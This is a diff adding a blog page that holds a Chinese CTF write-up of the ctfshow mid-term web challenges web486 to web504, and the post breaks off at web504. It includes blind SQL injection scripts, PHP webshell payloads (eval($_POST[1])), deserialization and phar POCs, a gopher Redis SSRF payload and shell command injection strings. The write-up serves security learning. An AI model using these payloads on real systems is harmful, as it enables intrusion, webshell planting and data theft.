@@ -1,0 +1,1685 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]中期测评 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web486
+根据报错信息提示，发现需要提供action参数，然后file_get_contents($_GET['action'].php)
+?action=../flag
+
+web487
+利用上题任意文件读取看index.php源码
+&..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]中期测评</h2>
+            <div class="post-date">2024-08-06</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowzhong-qi-ce-ping.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web486">web486</h2>
+<p>根据报错信息提示，发现需要提供action参数，然后<code>file_get_contents($_GET['action'].php)</code></p>
+<pre><code>?action=../flag
+</code></pre>
+<h2 id="web487">web487</h2>
+<p>利用上题任意文件读取看index.php源码</p>
+<pre><code class="language-php">&lt;?php
+include('render/render_class.php');
+include('render/db_class.php');
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$username=$_GET['username'];
+	$password=$_GET['password'];
+	$sql = &quot;select id from user where username = md5('$username') and password=md5('$password') order by id limit 1&quot;;
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$username));
+	}else{
+		header('location:index.php?action=login');
+	}
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>这里存在sql注入，然后username处应该是有回显的，但可能题目有问题，回显不了。<br>
+使用盲注脚本</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://df52edca-7258-4e0a-8b02-6943d7e6edd7.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        # payload = f'if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        payload = f'if(ascii(substr((select(group_concat(flag))from(ctfshow.flag)),{i},1))&gt;{mid},1,0)'
+        data = {
+            'username': f&quot;999')||{payload}#&quot;,
+            'password': &quot;123&quot;
+        }
+        r = requests.get(url,params=data,proxies=proxy)
+        if &quot;admin&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web488">web488</h2>
+<p>分析下源码<br>
+render_class.php</p>
+<pre><code class="language-php">
+&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		if(cache::cache_exists($template)){
+			echo cache::get_cache($template);
+		}else{
+			$templateContent=fileUtil::read('templates/'.$template.'.php');
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		}
+	}
+	public static  function shade($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
+		}
+		return $templateContent;
+	}
+
+}
+</code></pre>
+<p>cache_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+class cache{
+	public static function create_cache($template,$content){
+		if(file_exists('cache/'.md5($template).'.php')){
+			return true;
+		}else{
+			fileUtil::write('cache/'.md5($template).'.php',$content);
+		}
+	}
+	public static function get_cache($template){
+		return fileUtil::read('cache/'.md5($template).'.php');
+	}
+	public static function cache_exists($template){
+		return file_exists('cache/'.md5($template).'.php');
+	}
+
+}
+</code></pre>
+<p>在缓存文件功能处，存在任意写文件。</p>
+<p>可以控制md5(error).php的内容，在username处写入内容。</p>
+<pre><code>?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;password=123
+</code></pre>
+<p>访问<code>/cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code>连接shell</p>
+<h2 id="web489">web489</h2>
+<p>使用extract函数进行变量覆盖<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	$sql = &quot;select id from user where username = '&quot;.md5($username).&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+	extract($_GET);
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$username));
+	}else{
+		templateUtil::render('error');
+	}
+}
+
+if($action=='clear'){
+	system('rm -rf cache/*');
+	die('cache clear');
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>直接覆盖sql语句来写shell,但是没有写权限<br>
+还是只能盲注</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://ef0b4c73-1742-4596-951a-f359520c8d19.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',sleep(0.6),1)&quot;
+        data = {
+            'sql': f&quot;select {payload}&quot;
+        }
+        try:
+            r = requests.get(url,params=data,proxies=proxy, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web490">web490</h2>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('render/render_class.php');
+include('render/db_class.php');
+
+
+$action=$_GET['action'];
+if(!isset($action)){
+	header('location:index.php?action=login');
+	die();	
+}
+
+if($action=='check'){
+	extract($_GET);
+	$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+	$user=db::select_one($sql);
+	if($user){
+		templateUtil::render('index',array('username'=&gt;$user-&gt;username));
+	}else{
+		templateUtil::render('error');
+	}
+}
+if($action=='clear'){
+	system('rm -rf cache/*');
+	die('cache clear');
+}
+
+if($action=='login'){
+	templateUtil::render($action);
+}else{
+	templateUtil::render($action);
+}
+</code></pre>
+<p>username处存在sql注入。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://34dbfb2d-2b7b-4ffc-9f66-c4f653c2116f.challenge.ctf.show//index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        payload = f&quot;if(ascii(substr((select load_file('/flag')),{i},1))&gt;'{mid}',1,0)&quot;
+        data = {
+            'username': f&quot;admin' or {payload}#&quot;,
+            'password': &quot;123&quot;,
+
+        }
+        r = requests.get(url=url, params=data,proxies=proxy)
+        if '不存在' not in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web491">web491</h2>
+<p>同上</p>
+<h2 id="web492">web492</h2>
+<p>对username做了正则匹配，只能为字母数字。</p>
+<pre><code class="language-php">&lt;?php
+
+if($action=='check'){
+	extract($_GET);
+	if(preg_match('/^[A-Za-z0-9]+$/', $username)){
+		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+		$user=db::select_one_array($sql);
+	}
+	if($user){
+		templateUtil::render('index',$user);
+	}else{
+		templateUtil::render('error');
+	}
+}
+</code></pre>
+<p>render/render_class.php</p>
+<pre><code class="language-php">&lt;?php
+
+include('file_class.php');
+include('cache_class.php');
+
+class templateUtil {
+	public static function render($template,$arg=array()){
+		if(cache::cache_exists($template)){
+			echo cache::get_cache($template);
+		}else{
+			$templateContent=fileUtil::read('templates/'.$template.'.php');
+			$cache=templateUtil::shade($templateContent,$arg);
+			cache::create_cache($template,$cache);
+			echo $cache;
+		}
+	}
+	public static  function shade($templateContent,$arg){
+		foreach ($arg as $key =&gt; $value) {
+			$templateContent=str_replace('{{'.$key.'}}', '&lt;！--'.$value.'--&gt;', $templateContent);
+		}
+		return $templateContent;
+	}
+}
+</code></pre>
+<p>先使用变量覆盖，控制<code>$user</code>的值，再利用创建缓存文件来写入。</p>
+<pre><code>?action=check&amp;user[username]=--&gt;&lt;?php%20@eval($_POST[1]);?&gt;
+</code></pre>
+<p>访问<code>/cache/6a992d5529f459a44fee58c733255e86.php</code><br>
+连接shell即可。</p>
+<h2 id="web493">web493</h2>
+<p>存在反序列化入口。<br>
+index.php</p>
+<pre><code class="language-php">&lt;?php
+$action=$_GET['action'];
+if(!isset($action)){
+	if(isset($_COOKIE['user'])){
+		$c=$_COOKIE['user'];
+		$user=unserialize($c);
+		if($user){
+			templateUtil::render('index');
+		}else{
+			header('location:index.php?action=login');
+		}
+	}else{
+		header('location:index.php?action=login');
+	}
+	die();	
+}
+</code></pre>
+<p>找可以利用的destruct函数。<br>
+db_class.php</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+class db{
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username='root';
+	public $password='root';
+	public $port='3306';
+	public $addr='127.0.0.1';
+	public $database='ctfshow';
+	public function __construct(){
+		$this-&gt;log=new dbLog();
+		$this-&gt;db=$this-&gt;getConnection();
+	}
+
+	public function getConnection(){
+		 
+		return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
+	}
+
+	public  function select_one($sql){
+		$this-&gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&gt;query($sql);
+		if($result){
+			return $result-&gt;fetch_object();
+		}
+
+	}
+	public  function select_one_array($sql){
+		$this-&gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$conn-&gt;query($sql);
+		if($result){
+			return $result-&gt;fetch_assoc();
+		}
+
+	}
+	public function __destruct(){
+		$this-&gt;log-&gt;log($this-&gt;sql);
+	}
+}
+class dbLog{
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct(){
+		$this-&gt;log='log/'.date_format(date_create(),&quot;Y-m-d&quot;).'.txt';
+	}
+	public function log($sql){
+		$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
+	}
+	public function __destruct(){
+		file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
+	}
+}
+</code></pre>
+<p>poc</p>
+<pre><code class="language-php">&lt;?php
+
+class dbLog{
+public $sql;
+public $content;
+public $log;
+
+public function __construct(){
+$this-&gt;log='/var/www/html/1.php';
+$this-&gt;sql=&quot;&quot;;
+$this-&gt;content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
+}
+public function log($sql){
+$this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \r\n';
+}
+public function __destruct(){
+file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
+}
+}
+
+echo serialize(new dbLog());
+</code></pre>
+<p>url编码一下</p>
+<pre><code>Cookie: user=%4f%3a%35%3a%22%64%62%4c%6f%67%22%3a%33%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%73%3a%30%3a%22%22%3b%73%3a%37%3a%22%63%6f%6e%74%65%6e%74%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%22%3b%73%3a%33%3a%22%6c%6f%67%22%3b%73%3a%31%39%3a%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%7d;
+</code></pre>
+<h2 id="web494">web494</h2>
+<p>预期应该是sql注入绕过，但用上题payload的反序列化依然可以。<br>
+flag再数据库中。</p>
+<pre><code class="language-php">&lt;?php
+$action=$_GET['action'];
+if(!isset($action)){
+	if(isset($_COOKIE['user'])){
+		$c=$_COOKIE['user'];
+		if(preg_match('/\:|\,/', $c)){
+			$user=unserialize($c);
+		}
+		if($user){
+			templateUtil::render('index');
+		}else{
+			header('location:index.php?action=login');
+		}
+	}else{
+		header('location:index.php?action=login');
+	}
+	die();	
+}
+
+if($action=='check'){
+	extract($_GET);
+	if(!preg_match('/or|and|innodb|sys/i', $username)){
+		$sql = &quot;select username from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+		$db=new db();
+		$user=$db-&gt;select_one_array($sql);
+	}
+	if($user){
+		setcookie('user',$user);
+		templateUtil::render('index',$user);
+	}else{
+		templateUtil::render('error');
+	}
+}
+</code></pre>
+<h2 id="web495">web495</h2>
+<p>同上</p>
+<pre><code class="language-php">&lt;?php
+$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/file|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+</code></pre>
+<h2 id="web496">web496</h2>
+<p>反序列化入口被注释掉了，只能sql注入了</p>
+<pre><code class="language-php">&lt;?php
+$username=$_POST['username'];
+		$password=$_POST['password'];
+		if(!preg_match('/or|file|innodb|sys|mysql/i', $username)){
+			$sql = &quot;select username,nickname from user where username = '&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;;
+			$db=new db();
+			$user=$db-&gt;select_one_array($sql);
+		}
+</code></pre>
+<p>但是这里因为过滤了总表，没法查询表名和列名。（在知道的情况下可以注入）</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show/index.php?action=check&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    'http':&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    #print(i)
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        #print(&quot;mid&quot;,mid)
+        payload = f&quot;if(ascii(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{i},1))&gt;'{mid}',1,0)&quot;
+        data = {
+            'username': f&quot;123' || {payload}#&quot;,
+            'password': &quot;123&quot;,
+
+        }
+        r = requests.post(url=url, data=data,proxies=proxy,allow_redirects=False)
+        #print(r.status_code)
+        if 302 == r.status_code:
+            head = mid + 1
+            #print(&quot;in the right&quot;)
+        else:
+            tail = mid
+            #print(&quot;in the left&quot;)
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<p>使用万能账号登录进后台后，有一个更新密码功能。<br>
+admin_edit.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+include('../render/db_class.php');
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	$sql = &quot;update user set nickname='&quot;.substr($nickname, 0,8).&quot;' where username='&quot;.$user['username'].&quot;'&quot;;
+	$db=new db();
+	if($db-&gt;update_one($sql)){
+		$_SESSION['user']['nickname']=$nickname;
+		$ret['msg']='管理员信息修改成功';
+	}else{
+		$ret['msg']='管理员信息修改失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里没有过滤，存在update型注入</p>
+<pre><code class="language-py">import requests
+import string
+url=&quot;http://b078dfb1-17d3-4a27-bd57-c72019b486da.challenge.ctf.show&quot;
+s=string.ascii_lowercase+string.digits+&quot;,{-}&quot;
+sess=requests.session()
+sess.post(url+&quot;?action=check&quot;,data={&quot;username&quot;:&quot;1'||1#&quot;,&quot;password&quot;:1})
+flag=&quot;&quot;
+for i in range(9,70):
+        print(i)
+        for j in s:
+            data={
+            'nickname':str(i*2)+str(j), #不让nickname重复就行
+            #'user[username]':&quot;1'||if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))={1},1,0)#&quot;.format(i,j)
+            #'user[username]':&quot;1'||if(substr((select  group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#&quot;.format(i,j)
+            'user[username]':&quot;1'||if(substr((select  flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#&quot;.format(i,j)
+
+            }
+            r=sess.post(url+&quot;/api/admin_edit.php&quot;,data=data)
+            if(&quot;u529f&quot; in r.text):
+                flag+=j
+                print(flag)
+                break
+</code></pre>
+<h2 id="web497">web497</h2>
+<p>使用万能账号登录后台<br>
+上传图片处存在ssrf漏洞。</p>
+<p>render_class.php</p>
+<pre><code class="language-php">&lt;?php
+public static function checkImage($templateContent,$arg=array()){
+		foreach ($arg as $key =&gt; $value) {
+
+			if(stripos($templateContent, '{{img:'.$key.'}}')){
+				$encode='';
+				if(file_exists(__DIR__.'/../cache/'.md5($value))){
+					$encode=file_get_contents(__DIR__.'/../cache/'.md5($value));
+				}else{
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = 'data:image/jpg/png/gif;base64,' . $ret;
+					file_put_contents(__DIR__.'/../cache/'.md5($value), $encode);
+				}
+				$templateContent=str_replace('{{img:'.$key.'}}', $encode, $templateContent);
+			}
+			
+		}
+</code></pre>
+<p>payload</p>
+<pre><code>file:///flag
+</code></pre>
+<h2 id="web498">web498</h2>
+<p>同上存在ssrf，但是需要用ssrf打redis<br>
+使用poc</p>
+<pre><code>dict://127.0.0.1:6379
+</code></pre>
+<p>根据返回值发现存在redis服务<br>
+使用Gopherus生成payload</p>
+<pre><code>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+</code></pre>
+<p>连接shell.php，flag在根目录。</p>
+<h2 id="web499">web499</h2>
+<p>登录后台，系统配置功能处，能修改配置信息。</p>
+<p>注入php代码进<code>/config/settings.php</code></p>
+<h2 id="web500">web500</h2>
+<p>修改了配置文件的后缀，无法解析了。</p>
+<p>admin_settings.php</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+	foreach ($_POST as $key =&gt; $value) {
+		$config[$key]=$value;
+	}
+	file_put_contents(__DIR__.'/../config/settings', serialize($config));
+	$ret['msg']='管理员信息修改成功';
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>查看数据管理的数据库备份功能处<br>
+/api/admin_db_backup</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.$db_path);
+
+
+	if(file_exists(__DIR__.'/../backup/'.$db_path)){
+		$ret['msg']='数据库备份成功';
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>这里存在命令注入</p>
+<pre><code>db.zip&amp;&amp;cat /flag_bei_ni_fa_xian_le &gt;1.txt
+</code></pre>
+<h2 id="web501">web501</h2>
+<p>命令注入处添加了正则匹配，还是可以注入。</p>
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+
+error_reporting(0);
+$user= $_SESSION['user'];
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+
+	if(preg_match('/^zip|tar|sql$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format);
+		if(file_exists(__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'.'.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>payload</p>
+<pre><code>db_format=zip;cat /flag_bei_ni_fa_xian_le &gt;1.txt
+</code></pre>
+<h2 id="web502">web502</h2>
+<p>系統配置功能处存在文件上传，且只有前台校验文件类型。</p>
+<p>api/admin_upload.php</p>
+<pre><code class="language-php">&lt;?php
+$arr = $_FILES[&quot;file&quot;];
+	if(($arr[&quot;type&quot;]==&quot;image/jpeg&quot; || $arr[&quot;type&quot;]==&quot;image/png&quot; ) &amp;&amp; $arr[&quot;size&quot;]&lt;10241000 )
+	{
+		$arr[&quot;tmp_name&quot;];
+		$filename = md5($arr['name']);
+		$ext = pathinfo($arr['name'],PATHINFO_EXTENSION);
+		if(!preg_match('/^php$/i', $ext)){
+			$basename = &quot;../img/&quot;.$filename.'.' . $ext;
+			move_uploaded_file($arr[&quot;tmp_name&quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.'/../config/settings'));
+			$config['logo']=$filename.'.' . $ext;
+			file_put_contents(__DIR__.'/../config/settings', serialize($config));
+			$ret['msg']='文件上传成功';
+		}
+		
+	}else{
+		$ret['msg']='文件上传失败';
+	}
+	
+	die(json_encode($ret));
+</code></pre>
+<p>后台会校验，不让后缀为php，考虑用其他后缀来绕过，单发现都不解析。。。</p>
+<p>上传文件路径为<code>/img/md5(&quot;filename&quot;).phtml</code><br>
+也可以在<code>config/settings</code>中看到路径</p>
+<p>发现之前的命令注入处依然可以利用<br>
+api/admin_db_backup.php</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+
+include('../render/db_class.php');
+error_reporting(0);
+$user= $_SESSION['user'];
+$pre=__DIR__.'/../backup/'.date_format(date_create(),'Y-m-d').'/db.';
+$ret = array(
+		&quot;code&quot;=&gt;0,
+		&quot;msg&quot;=&gt;&quot;查询失败&quot;,
+		&quot;count&quot;=&gt;0,
+		&quot;data&quot;=&gt;array()
+	);
+if($user){
+	extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.$pre.$db_format);
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+
+}else{
+	$ret['msg']='请登录后使用此功能';
+	die(json_encode($ret));
+}
+</code></pre>
+<p>正则添加括号后，无法再绕过了，但是多了一个pre参数可以利用。</p>
+<pre><code>db_format=zip&amp;pre=1;cat /flag_bei_ni_fa_xian_le &gt; /var/www/html/1.txt;echo
+</code></pre>
+<h2 id="web503">web503</h2>
+<p>api/admin_db_backup.php</p>
+<pre><code class="language-php">&lt;?php
+extract($_POST);
+	if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+			die(json_encode($ret));
+	}
+
+	if(preg_match('/^(zip|tar|sql)$/', $db_format)){
+		shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.md5($pre.$db_format));
+		if(file_exists($pre.$db_format)){
+			$ret['msg']='数据库备份成功';
+		}else{
+			$ret['msg']='数据库备份失败';
+		}
+	}else{
+		$ret['msg']='数据库备份失败';
+	}
+	die(json_encode($ret));
+</code></pre>
+<p>这里使用md5的方式，无法进行注入了。<br>
+存在file_exists函数，并且网站logo处存在任意文件上传。<br>
+可以考虑使用phar://反序列化。参考文章<a href="https://xz.aliyun.com/t/6699">php反序列化拓展攻击详解--phar</a></p>
+<p>生成phar包</p>
+<pre><code class="language-php">&lt;?php
+class dbLog{
+    public $sql;
+    public $content=&quot;&lt;?php @eval(\$_POST[1])?&gt;&quot;;
+    public $log=&quot;/var/www/html/1.php&quot;;
+}
+
+$c=new dbLog();
+
+$phar = new Phar(&quot;ctfshow.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($c); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;a&quot;, &quot;a&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
+<p>修改名为png上传<br>
+<img src="https://fallingskies22.github.io/post-images/1723285773930.png" alt="" loading="lazy"></p>
+<p>再数据库备份功能处，触发发序列化<br>
+<img src="https://fallingskies22.github.io/post-images/1723285800542.png" alt="" loading="lazy"></p>
+<p>访问shell即可获得flag。</p>
+<h2 id="web504">web504</h2>
+<p>增加了模板管理功能。<br>
+在新增模板功能处存在任意文件上传，且存在目录穿越。<br>
+利用<code>/api/admin_settings.php</code>中的/config/settings来触发反序列化。</p>
+<p>上传文件</p>
